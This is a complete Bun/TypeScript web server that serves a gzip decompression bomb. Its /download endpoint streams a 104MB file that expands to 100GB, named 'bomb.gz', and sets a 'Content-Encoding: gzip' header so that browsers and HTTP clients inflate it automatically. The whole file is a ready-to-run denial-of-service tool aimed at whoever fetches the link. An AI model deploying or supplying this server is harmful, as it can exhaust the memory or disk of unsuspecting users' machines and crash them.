import { serve } from "bun";
import { file } from "bun";

const PORT = 3000;
const ZIP_FILE_PATH = "./bigboy.gz"; // Path to your compressed file

serve({
  port: PORT,
  async fetch(req) {
    const url = new URL(req.url);

    // Only serve the file at the /download endpoint
    if (url.pathname === "/download") {
      try {
        // Use Bun's file API to get the compressed file
        const compressedFile = file(ZIP_FILE_PATH);
        const fileSize = compressedFile.size;

        // Set headers to trigger browser decompression
        const headers = new Headers();
        headers.set("Content-Type", "application/octet-stream");
        headers.set("Content-Length", fileSize.toString());
        headers.set("Content-Encoding", "gzip");
        headers.set("Content-Disposition", `attachment; filename="bomb.gz"`);
        headers.set("Cache-Control", "no-store, max-age=0");
        headers.set("ETag", `"${Math.random().toString(36).substring(2, 15)}"`);
        headers.set("X-Compression-Ratio", "666:1");

        return new Response(compressedFile.stream(), {
          status: 200,
          headers: headers,
        });
      } catch (error) {
        console.error("Error serving file:", error);
        return new Response("Error serving file", { status: 500 });
      }
    }

    // Serve a simple HTML page with a download link
    return new Response(
      `
      <!DOCTYPE html>
      <html>
        <head>
          <title>File Download</title>
        </head>
        <body>
          <h1>Compressed File Server</h1>
          <p>Click below to download the file (104MB compressed, 100GB uncompressed)</p>
          <a href="/download">Download File</a>
        </body>
      </html>
    `,
      {
        headers: {
          "Content-Type": "text/html",
        },
      },
    );
  },
});

console.log(`Server running at http://localhost:${PORT}`);
